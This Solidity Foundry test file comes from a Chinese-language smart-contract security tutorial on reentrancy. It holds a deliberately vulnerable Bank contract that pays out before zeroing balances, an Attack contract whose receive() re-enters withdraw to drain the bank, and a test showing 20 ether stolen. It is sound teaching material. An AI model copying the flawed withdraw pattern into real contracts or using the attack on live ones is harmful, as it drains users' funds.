// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";

/**
    WTF Solidity 合约安全: S01. 重入攻击

    ref https://www.wtf.academy/solidity-104/ReentrancyAttack/

    command `forge test -vvv --contracts ./src/wtf/S01ReentrancyAttack.sol`
 */
contract Bank {
    mapping(address => uint256) public balanceOf; // 余额mapping

    // 存入ether，并更新余额
    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
    }

    // 提取msg.sender的全部ether
    function withdraw() external {
        uint256 balance = balanceOf[msg.sender]; // 获取余额
        require(balance > 0, "Insufficient balance");
        // 转账 ether !!! 可能激活恶意合约的fallback/receive函数，有重入风险！
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Failed to send Ether");
        // 更新余额
        balanceOf[msg.sender] = 0;
    }

    // 获取银行合约的余额
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

contract Attack {
    Bank public bank; // Bank合约地址

    // 初始化Bank合约地址
    constructor(Bank _bank) {
        bank = _bank;
    }

    // 回调函数，用于重入攻击Bank合约，反复的调用目标的withdraw函数
    receive() external payable {
        if (bank.getBalance() >= 1 ether) {
            bank.withdraw();
        }
    }

    // 攻击函数，调用时 msg.value 设为 1 ether
    function attack() external payable {
        require(msg.value == 1 ether, "Require 1 Ether to attack");
        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }

    // 获取本合约的余额
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

contract ContractTest is Test {
    Bank bank;
    Attack attack;

    function setUp() public {}

    function testReentrancy() public {
        address alice = vm.addr(1);
        address bob = vm.addr(2);
        
        bank = new Bank();
        bank.deposit{value: 20 ether}();
        assertEq(bank.getBalance(), 20 ether);

        attack = new Attack(bank);
        attack.attack{value: 1 ether}();
        assertEq(bank.getBalance(), 0);
        console.log("Bank balance:", bank.getBalance());
        assertEq(attack.getBalance(), 21 ether);
        console.log(
            "Attack profit(ether):",
            (attack.getBalance() - 1 ether) / 1 ether
        );
    }
}
